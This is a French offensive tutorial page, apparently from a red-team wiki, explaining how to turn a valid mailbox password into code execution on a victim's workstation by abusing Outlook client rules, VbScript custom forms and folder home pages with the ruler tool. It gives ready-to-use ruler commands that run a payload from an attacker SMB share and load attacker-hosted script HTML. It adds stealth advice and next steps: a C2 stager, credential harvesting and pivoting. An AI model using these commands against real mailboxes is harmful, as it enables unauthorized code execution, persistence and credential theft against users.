---
order: 6
title: "Abus de client Outlook : règles, formulaires et pages d'accueil via MAPI"
description: "Transformer un identifiant de boîte aux lettres valide en exécution de code sur le poste de travail de la victime sans RCE serveur : armer des règles Outlook côté client qui lancent un payload à la réception d'un message, des formulaires VbScript personnalisés déclenchés par un message forgé, et le WebView de la page d'accueil de dossier qui charge du HTML de l'attaquant à l'ouverture du dossier, le tout poussé via MAPI/EWS avec ruler."
keywords:
  - Outlook rules
  - custom forms
  - folder home page
  - ruler
  - MAPI
---

# Abus de client Outlook

Quand vous détenez un identifiant de boîte aux lettres valide mais n'avez aucune exécution de code serveur, le **client** Outlook est le mécanisme de livraison du payload. Trois fonctionnalités Outlook héritées exécutent du code contrôlé par l'attaquant sur tout poste de travail qui synchronise la boîte aux lettres : des **règles** côté client qui démarrent une application à la réception d'un message, des **formulaires** personnalisés qui portent du VbScript exécuté à la lecture d'un message forgé, et le WebView de la **page d'accueil** de dossier qui charge une URL de l'attaquant à l'ouverture du dossier. Les trois sont stockées dans la boîte aux lettres et poussées à distance via MAPI/EWS, donc vous les armez depuis Linux avec `ruler` en n'utilisant que l'identifiant. Le code s'exécute dans le contexte de l'utilisateur la prochaine fois qu'Outlook se synchronise.

## Préconditions

- Un identifiant de boîte aux lettres valide (issu du [spraying](password-spraying.md)) et MAPI/HTTP ou EWS accessible (`ruler` autodécouvre l'endpoint).
- La victime exécute le client **Outlook** de bureau (ce sont des fonctionnalités client ; les utilisateurs uniquement OWA ne sont pas affectés).
- Un emplacement de payload accessible pour le chemin des règles (un chemin UNC/WebDAV ou un chemin local que vous pouvez préparer), ou un serveur web de l'attaquant pour la variante page d'accueil.

## Règles : lancer un payload à la réception

Une règle côté client avec une action « démarrer une application » exécute l'exécutable référencé quand un message correspondant au déclencheur arrive. `ruler` crée la règle à distance et envoie le message déclencheur :

```bash
# Create a rule that runs a payload when a message with the trigger subject arrives, then send it
ruler --email victim@example.com --username 'EXAMPLE\john.doe' --password 'Password1' \
  rule add --name updater --trigger "pwned" --location "\\10.10.14.7\share\payload.exe" --send
ruler --email victim@example.com --username 'EXAMPLE\john.doe' --password 'Password1' \
  rule display   # confirm the rule is present in the mailbox
```

Interprétez-le : `rule add ... --send` rapporte que la règle a été écrite et le courrier déclencheur expédié. Quand l'Outlook de la victime se synchronise et que la règle se déclenche, elle exécute `payload.exe` depuis le chemin UNC dans la session de l'utilisateur. Hébergez le payload sur un partage WebDAV ou SMB que le poste de travail peut atteindre ; `rule display` listant votre règle confirme l'écriture même avant que le déclencheur n'atterrisse.

## Formulaires : VbScript derrière un message forgé

Un formulaire de message personnalisé peut porter un gestionnaire VbScript qui s'exécute à l'ouverture ou à l'aperçu automatique d'un message de la classe de ce formulaire. `ruler` téléverse le formulaire vers la boîte aux lettres et envoie un message qui l'instancie :

```bash
# Upload a malicious form and trigger it with a matching message
ruler --email victim@example.com --username 'EXAMPLE\john.doe' --password 'Password1' \
  form add --suffix pwn --input command.txt --send
ruler --email victim@example.com --username 'EXAMPLE\john.doe' --password 'Password1' \
  form display
```

`command.txt` contient la commande que le VbScript du formulaire exécute. Le `--send` le déclenche immédiatement ; `form display` confirme que le formulaire est stocké. Les formulaires s'exécutent sans que l'utilisateur ne clique sur une pièce jointe, raison pour laquelle ils sont plus discrets que le lancement UNC visible de la règle.

## Page d'accueil : HTML WebView à l'ouverture du dossier

La **page d'accueil** d'un dossier est une URL qu'Outlook rend dans un WebView quand le dossier est sélectionné. Pointez-la vers du HTML de l'attaquant qui exécute du script (un payload ActiveX/script classique) et il s'exécute quand la victime ouvre le dossier :

```bash
# Set the Inbox home page to an attacker URL serving the payload HTML
ruler --email victim@example.com --username 'EXAMPLE\john.doe' --password 'Password1' \
  homepage add --url "http://10.10.14.7/p.html"
```

Un message de succès signifie que la propriété `homepage` a été écrite dans le dossier. Quand la victime parcourt ensuite ce dossier, Outlook récupère et rend `p.html`, exécutant son script dans le contexte de l'utilisateur.

## Suite

N'importe laquelle des trois produit une exécution de code dans la **session de l'utilisateur victime** sur son poste de travail la prochaine fois qu'Outlook se synchronise ou que le déclencheur se déclenche. C'est un foothold sur un endpoint utilisateur atteint purement depuis un identifiant de boîte aux lettres, sans compromission serveur. À partir de là, lancez un stager C2, récoltez les identifiants et tokens locaux, et pivotez dans le réseau interne. Associez-le au [dump de la GAL](enumeration.md) pour choisir des destinataires à forte valeur.

## Notes d'exploitation

- Choisissez la technique selon ce que la cible autorise : les règles nécessitent un chemin de payload UNC/WebDAV accessible et sont les plus visibles ; les formulaires s'exécutent sans interaction utilisateur et sont plus discrets ; la page d'accueil nécessite un serveur web de l'attaquant et que le dossier soit ouvert.
- Ce sont des fonctionnalités client stockées côté serveur, donc la victime n'a rien à accepter ; la prochaine synchronisation Outlook livre la règle, le formulaire ou le changement de page d'accueil.
- Les builds Outlook plus récents désactivent ou avertissent sur certaines de ces méthodes (pages d'accueil externes, règles de démarrage d'application), donc testez lesquelles le build de la cible honore encore ; les clients hérités ou non gérés sont les plus fiables.
- `ruler brute` fait aussi du spray et `ruler` autodécouvre l'endpoint, donc un seul outil couvre la validation d'identifiant et l'abus.

## Outils

- **ruler** (SensePost) : abus de règles, de formulaires et de pages d'accueil via MAPI/EWS depuis Linux.
- **Client Outlook de bureau** : création manuelle de règles/formulaires quand vous avez déjà une session interactive.
- **Responder / impacket smbserver / WebDAV** : héberger le payload pour le chemin de lancement de la règle.

## Références

- [SensePost: ruler and the Outlook rules attack](https://sensepost.com/blog/2017/outlook-forms-and-shells/)
- [ruler (SensePost)](https://github.com/sensepost/ruler)
- [SpecterOps: Outlook home page persistence and abuse](https://posts.specterops.io/outlook-today-homepage-persistence-33ea9b505943)
